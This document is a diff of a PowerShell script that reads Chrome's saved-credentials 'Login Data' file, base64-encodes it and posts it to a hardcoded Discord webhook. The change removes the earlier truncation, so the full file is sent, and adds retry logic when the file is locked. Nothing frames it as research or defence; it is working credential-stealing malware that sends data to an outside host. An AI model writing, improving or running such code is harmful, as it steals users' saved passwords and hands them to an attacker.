@@ -1,49 +1,56 @@
+# Path to the Chrome Login Data file
 $filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-$copyPath = "$env:TEMP\LoginDataCopy"
 
+# Function to wait until Chrome is fully closed
 function Wait-ForChromeToClose {
-    while (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
+    while (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
         Write-Host "Waiting for Chrome to close..."
         Start-Sleep -Seconds 3
     }
 }
 
+# Wait for Chrome to close before accessing the file
 Wait-ForChromeToClose
-Write-Host "Chrome closed. Proceeding to copy file..."
 
-try {
-    Copy-Item -LiteralPath $filePath -Destination $copyPath -Force -ErrorAction Stop
-    Write-Host "File copied successfully to $copyPath"
-} catch {
-    Write-Host "Failed to copy file. It might still be locked or inaccessible."
+# After Chrome is closed, verify file exists
+if (-Not (Test-Path $filePath)) {
+    Write-Host "File not found: $filePath"
     exit
 }
 
-try {
-    $fileBytes = [System.IO.File]::ReadAllBytes($copyPath)
-} catch {
-    Write-Host "Failed to read copied file."
+# Try to read the file bytes safely with retries if locked
+$maxRetries = 5
+$retryCount = 0
+$fileBytes = $null
+
+while (-not $fileBytes -and $retryCount -lt $maxRetries) {
+    try {
+        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    }
+    catch {
+        Write-Host "File locked or inaccessible, retrying in 2 seconds..."
+        Start-Sleep -Seconds 2
+        $retryCount++
+    }
+}
+
+if (-not $fileBytes) {
+    Write-Host "Failed to read file after $maxRetries attempts."
     exit
 }
 
-if (-not $fileBytes -or $fileBytes.Length -eq 0) {
-    Write-Host "File is empty or could not be read."
-    exit
-}
-
+# Convert file bytes to Base64 string for safe transmission
 $fileBase64 = [Convert]::ToBase64String($fileBytes)
 
-if ($fileBase64.Length -gt 1500) {
-    $fileBase64 = $fileBase64.Substring(0, 1500) + "..."
-}
-
-$jsonPayload = '{"content":"Base64 preview of Login Data:`n```' + $fileBase64 + '```"}'
-
+# Your Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"
 
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
-    Write-Host "Base64 preview sent to Discord webhook."
-} catch {
-    Write-Host "Failed to send message to Discord webhook."
-}
+# Prepare JSON payload
+$payload = @{
+    content = "Base64 preview of Login Data:`n$fileBase64"
+} | ConvertTo-Json -Depth 3
+
+# Send the POST request to Discord webhook
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+
+Write-Host "Base64 preview sent to Discord webhook."
